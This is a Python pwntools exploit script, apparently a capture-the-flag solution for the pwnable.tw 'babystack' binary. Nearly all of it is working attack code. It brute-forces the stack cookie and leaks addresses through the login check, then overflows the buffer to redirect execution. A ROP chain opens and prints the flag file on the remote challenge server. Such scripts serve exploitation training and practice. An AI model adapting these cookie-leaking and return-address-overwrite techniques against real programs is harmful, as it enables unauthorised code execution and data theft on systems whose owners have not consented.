#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *
from binascii import hexlify, unhexlify
# CUSTOM FUNCTIONS
def _snd(s):
  io.send(str(s))
def _sndl(s):
  io.sendline(str(s))
def _snda(a,s):
  io.sendafter(str(a),str(s))
def _sndla(a,s):
  io.sendlineafter(str(a),str(s))
def _rcvu(s):
  return io.recvuntil(str(s))
def _rcva():
  return io.recvall()
def _rcvn(n):
  return io.recv(n)
def _rcvl():
  return io.recvline()
context.terminal = ['tmux', 'split', '-h']

exe = context.binary = ELF('babystack')
env = {'LD_PRELOAD':'./libc_64.so.6'}
#env={}

host = args.HOST or 'chall.pwnable.tw'
port = int(args.PORT or 10205)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, env=env, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, env=env, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
#break *(0x1051+0x0000555555554000)
#break *(0xFF1+0x0000555555554000)
#break *(0xE43+0x0000555555554000)
continue
'''.format(**locals())

# -- Exploit goes here --

FILL_CHAR = "#"
def login(password = "", line = "\n", fill = False):
    global logged_in

    if fill:
        _snda('>>', "1".ljust(16, FILL_CHAR))
    else:
        _snda('>>', 1)

    if logged_in:
        logged_in = False
        return

    _snda(':', password + line)

    data = _rcvu('!')
    if "Failed" in data:
        logged_in = False
    else:
        logged_in = True

def quit():
    _snda('>>', 2)

def copy(s):
    _snda('>>', 3)
    _snda(':', s)

def bruteforce(l = 8, initial = "", fill = False):
    log.info("Bruteforce started")
    leaked = initial

    for i in range(l):
        found = None

        for c in range(0x1, 0xff + 1):
            log.debug("Trying {} - {}".format(chr(c), leaked))
            if c == 0xa: continue
            login(leaked + chr(c), fill = fill)
            if logged_in:
                log.info("Found character {} ({})".format(chr(c), hex(c)))
                found = chr(c)
                login()
                break

        if found == None:
            log.error("Bruteforce failed.")
            log.info("Maybe the string contains illegal characters (0xa or 0x0).")
            raise Exception("BF failed")
        leaked += found

    return leaked[len(initial):]

io = None
logged_in = False
def exploit():
    global io, logged_in
    io = start()
    logged_in = False

    # cookie            - 16 bytes
    # menu input buffer - 16 bytes (or some 6-byte addr from stack here)
    # executable addr   - 6 bytes

    # leak the cookie
    leaked = bruteforce(16 + 6)
    cookie = leaked[:16]
    stack_addr   = leaked[16:]
    stack_addr   = unpack(stack_addr + "\x00\x00")
    log.success("Leaked cookie: {}".format(hexlify(cookie)))
    log.success("Leaked (some) stack addr: {}".format(hex(stack_addr)))

    # leak the addr
    leaked      = bruteforce(6, initial = cookie + "1".ljust(16, FILL_CHAR), fill = True)
    addr        = unpack(leaked + "\x00\x00") - 0x1060
    exe.address = addr
    log.success("Leaked binary base address: {}".format(hex(addr)))


    # 64 chars + cookie + 16 chars + rbp + rip
    rip = pack(exe.address + 0xCA0)
    #log.info("Return to {}".format(hex(rip)))
    #rip = pack(rip)
    login("\x00" + "A"*63 + cookie + "".ljust(16 + 8, FILL_CHAR) + rip, "")

    if not logged_in:
        log.error("You must be logged in")
        raise Exception("BF failed")

    copy("B"*63)
    quit()

    # WARNING
    # NOASLR option causes a read error

    # read_input() function has some mov eax, [rax] instruction
    # which uses an address from the stack
    # if it is invalid, the program will be aborted
    # that's why we send some valid address in the beginning of the rop chain
    bss_free_area = exe.address + 0x202018

    rop = ROP(exe)
    rop.read(0, bss_free_area)
    rop.open(bss_free_area, 0)
    rop.read(3, bss_free_area)
    rop.puts(bss_free_area)
    rop.exit(0)
    log.info(rop.dump())
    rop = pack(stack_addr) + "A"*24 + rop.chain()
    _snd(rop)
    _snd("/home/babystack/flag\x00")

    io.interactive()

exploit()

